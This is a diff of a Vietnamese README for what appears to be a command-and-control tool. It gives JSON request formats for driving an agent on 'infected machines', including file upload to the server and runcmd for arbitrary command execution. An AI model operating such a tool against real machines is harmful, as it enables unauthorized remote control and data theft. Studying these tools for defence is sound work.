@@ -45,36 +45,36 @@ Các máy bị nhiễm liên tục hỏi server xem lệnh tiếp theo cần th�
 - Chạy agent.py. Quan sát cửa sổ dòng lệnh của CommandCenter có kết quả trả về của lệnh được thực hiện hiện tại. Lệnh mặt định ban đầu là pwd (in ra đường dẫn tuyệt đối của thư mục hiện tại)
 - Muốn điều khiển các Agent, thực hiện gửi POST request lên endpoint set_action của CommandCenter. Nội dung của request gồm lệnh muốn máy bị điều khiển thực hiện và một số thông tin khác tùy theo lệnh. Để gửi các request có thể dùng các tool như Postman (GUI) hay curl (CLI)
 - Body của các request đều phải để dưới dạng json. Định dạng các lệnh:
-pwd: 
+pwd  
 {
 	"command":"pwd",
 }
 
-cd
+cd  
 {
 	"command":"cd",
 	"extra" : "/home/abcde" //duong dan den thu muc muon chuyen den
 }
 
-ls
+ls  
 {
 	"command":"ls",
 	"extra" : "/home/abcde" //duong dan den thu muc muon liet ke file
 }
 
-upload
+upload  
 {
 	"command":"upload",
 	"extra" : "abc.txt" //tên file muốn upload. File phải ở trong thư mục hiện tại
 }
 
-Standby
+Standby  
 {
 	"command":"Standby",
 	"extra" : "0.0012" //Khoảng thời gian standby (tính bằng giờ. 0.0012h = 5s)
 }
 
-runcmd
+runcmd  
 {
 	"command":"runcmd",
 	"extra" : "ten command" //Lệnh muốn thực hiện trên terminal/cmd
